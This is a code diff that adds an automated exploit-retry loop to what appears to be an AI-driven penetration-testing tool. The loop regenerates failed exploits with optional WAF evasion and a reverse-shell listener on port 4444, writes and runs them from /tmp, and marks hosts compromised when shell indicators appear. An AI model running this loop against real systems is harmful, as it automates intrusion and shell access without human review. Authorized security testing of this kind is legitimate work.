@@ -7438,6 +7438,174 @@ ${(() => {
           console.warn(`[FeedbackLoop] Failed to record exploit result:`, fbErr.message);
         }
 
+        // ── Phase 3: Automated Exploit Retry ──────────────────────────────────
+        // When an exploit fails, analyze the failure, select an adaptive strategy,
+        // and retry with a revised exploit up to maxRetries times.
+        if (!success && generatedExploit?.code) {
+          try {
+            const {
+              analyzeFailure, selectRetryStrategy, createRetrySession,
+              shouldRetry: shouldRetryCheck, recordRetryAttempt, getBackoffDelay,
+              buildRetryPromptSection,
+            } = await import("./exploit-retry-engine");
+            const { buildFeedbackContextForExploit } = await import("./exploit-feedback-integration");
+            const { generateFunctionalExploit: retryGenerate } = await import("./functional-exploit-generator");
+            const { executeRawCommand: retryExec } = await import("./scan-server-executor");
+
+            const retrySession = createRetrySession(
+              state.engagementId, target, Number(port), service || "unknown",
+              { code: generatedExploit.code, language: generatedExploit.language, reasoningChain: generatedExploit.reasoningChain },
+              { maxRetries: state.trainingLabMode ? 3 : 2 },
+              cve || undefined, module || undefined
+            );
+
+            let retrySuccess = false;
+            while (!retrySession.complete) {
+              const failureAnalysis = analyzeFailure(exploitOutput, undefined, retrySession.attempts);
+              const retryDecision = shouldRetryCheck(retrySession, failureAnalysis);
+              if (!retryDecision.shouldRetry) {
+                addLog(state, { phase: "exploitation", type: "info", title: `🔄 Retry Skipped: ${target}:${port}`, detail: retryDecision.reason });
+                retrySession.complete = true;
+                retrySession.outcome = "exhausted";
+                break;
+              }
+
+              // Backoff delay
+              const delay = getBackoffDelay(retrySession);
+              addLog(state, { phase: "exploitation", type: "info", title: `🔄 Retry #${retrySession.retryCount + 1}: ${target}:${port}`, detail: `${failureAnalysis.category} detected. Strategy: ${failureAnalysis.suggestedAdjustments[0]?.type || 'standard'}. Waiting ${delay}ms...` });
+              await new Promise(r => setTimeout(r, delay));
+
+              // Get fresh feedback context
+              let retryFeedback: any = null;
+              try { retryFeedback = await buildFeedbackContextForExploit(state.engagementId, target, Number(port), service || "unknown"); } catch {}
+
+              const retryStrategy = selectRetryStrategy(failureAnalysis, retryFeedback, retrySession.attempts, retrySession.config);
+              const retryPrompt = buildRetryPromptSection(retrySession, failureAnalysis, retryStrategy);
+
+              // Generate revised exploit with retry context
+              const retryStartTime = Date.now();
+              try {
+                const vulnForRetry = asset?.vulns.find(v => v.cve === cve || v.title.includes(service));
+                const retryExploit = await retryGenerate({
+                  vulnerability: {
+                    cve: cve || undefined,
+                    title: vulnForRetry?.title || `${service} exploit`,
+                    severity: vulnForRetry?.severity || 'critical',
+                    description: (vulnForRetry?.description || `Vulnerability in ${service} on port ${port}`) + `\n\n${retryPrompt}`,
+                    service: service || 'http',
+                    port: Number(port),
+                  },
+                  target: {
+                    hostname: target,
+                    ip: asset?.ip || undefined,
+                    os: asset?.os || undefined,
+                    technologies: asset?.technologies || [],
+                    wafDetected: (asset as any)?.wafDetected || undefined,
+                    ports: asset?.ports?.map(p => ({ port: p.port, service: p.service, version: p.version })) || [],
+                  },
+                  includeEvasion: retryStrategy.evasionRequired,
+                  trainingLabMode: state.trainingLabMode === true,
+                  attackerHost: scanServerHost || undefined,
+                  attackerPort: 4444,
+                });
+
+                if (retryExploit?.code) {
+                  // Execute retry exploit
+                  const retryFileName = `exploit_retry_${state.engagementId}_${retrySession.retryCount}_${Date.now()}.py`;
+                  const retryB64 = Buffer.from(retryExploit.code).toString('base64');
+                  await retryExec(`echo '${retryB64}' | base64 -d > /tmp/${retryFileName}`, 15);
+                  if (retryExploit.prerequisites?.length > 0) {
+                    const pkgs = retryExploit.prerequisites.filter(p => /^[a-zA-Z0-9_-]+$/.test(p)).slice(0, 5);
+                    if (pkgs.length > 0) try { await retryExec(`pip3 install --quiet ${pkgs.join(' ')} 2>/dev/null || true`, 30); } catch {}
+                  }
+                  const retryTimeout = state.trainingLabMode ? 120 : 60;
+                  const retryResult = await retryExec(`cd /tmp && timeout ${retryTimeout} python3 ${retryFileName} 2>&1 || true`, retryTimeout + 30);
+                  const retryOutput = typeof retryResult === 'string' ? retryResult : (retryResult?.stdout || retryResult?.stderr || '');
+
+                  // Check success
+                  const shellIndicators = [/shell.*opened/i, /session.*opened/i, /meterpreter/i, /uid=\d+/i, /root@/i, /www-data@/i];
+                  const webIndicators = [/EXPLOIT_SUCCESS/i, /successfully.*exploit/i, /vulnerability.*confirmed/i, /injection.*successful/i, /extracted.*data/i];
+                  retrySuccess = shellIndicators.some(re => re.test(retryOutput)) ||
+                    (state.trainingLabMode === true && webIndicators.some(re => re.test(retryOutput)) && !/EXPLOIT_FAILED/i.test(retryOutput));
+
+                  recordRetryAttempt(retrySession, {
+                    attemptNumber: retrySession.retryCount + 1,
+                    timestamp: Date.now(),
+                    strategy: retryStrategy,
+                    failureAnalysis,
+                    adjustmentsApplied: failureAnalysis.suggestedAdjustments.slice(0, 3),
+                    exploitModified: true,
+                    result: { success: retrySuccess, output: retryOutput.slice(0, 2000), executionMs: Date.now() - retryStartTime },
+                    reasoningTrail: retryStrategy.reasoning,
+                  });
+
+                  addLog(state, {
+                    phase: "exploitation",
+                    type: retrySuccess ? "exploit_success" : "exploit_fail",
+                    title: retrySuccess ? `✅ Retry #${retrySession.retryCount} Succeeded: ${target}` : `❌ Retry #${retrySession.retryCount} Failed: ${target}`,
+                    detail: `Strategy: ${retryStrategy.approach}. ${retryOutput.slice(0, 500)}`,
+                    data: { retrySessionId: retrySession.sessionId, attemptNumber: retrySession.retryCount },
+                  });
+
+                  if (retrySuccess) {
+                    // Update the main success/output variables
+                    success = true;
+                    exploitOutput = retryOutput;
+                    shellType = retryExploit.shellType || undefined;
+                    shellPayload = retryExploit.shellPayload || undefined;
+                    if (asset) {
+                      asset.status = "compromised";
+                      state.stats.exploitsSucceeded++;
+                      const hasShell = /shell.*opened|session.*opened|meterpreter|uid=\d+|root@|www-data@/i.test(retryOutput);
+                      if (!isTrainingLabExploit || hasShell) state.stats.sessionsOpened++;
+                    }
+                    shellSessionId = `session-${genId()}`;
+                    break;
+                  }
+                  // Update exploitOutput for next iteration's failure analysis
+                  exploitOutput = retryOutput;
+                } else {
+                  recordRetryAttempt(retrySession, {
+                    attemptNumber: retrySession.retryCount + 1,
+                    timestamp: Date.now(),
+                    strategy: retryStrategy,
+                    failureAnalysis,
+                    adjustmentsApplied: [],
+                    exploitModified: false,
+                    result: { success: false, output: "Retry generator produced no code", executionMs: Date.now() - retryStartTime },
+                    reasoningTrail: retryStrategy.reasoning,
+                  });
+                }
+              } catch (retryErr: any) {
+                recordRetryAttempt(retrySession, {
+                  attemptNumber: retrySession.retryCount + 1,
+                  timestamp: Date.now(),
+                  strategy: retryStrategy,
+                  failureAnalysis,
+                  adjustmentsApplied: [],
+                  exploitModified: false,
+                  result: { success: false, output: retryErr.message, executionMs: Date.now() - retryStartTime },
+                  reasoningTrail: retryStrategy.reasoning,
+                });
+                addLog(state, { phase: "exploitation", type: "warning", title: `Retry Error: ${target}`, detail: retryErr.message });
+              }
+            }
+
+            // Log final retry session outcome
+            if (retrySession.attempts.length > 0) {
+              addLog(state, {
+                phase: "exploitation",
+                type: retrySession.outcome === "success" ? "info" : "warning",
+                title: `🔄 Retry Session Complete: ${target}:${port}`,
+                detail: `Outcome: ${retrySession.outcome}. Attempts: ${retrySession.retryCount}. Total retry time: ${retrySession.totalRetryMs}ms.`,
+                data: { retrySessionId: retrySession.sessionId, outcome: retrySession.outcome, attempts: retrySession.retryCount },
+              });
+            }
+          } catch (retryEngineErr: any) {
+            console.warn(`[RetryEngine] Failed to run retry engine:`, retryEngineErr.message);
+          }
+        }
+
         // Auto-trigger post-exploitation playbook when a shell is obtained
         if (success) {
           onShellObtained({
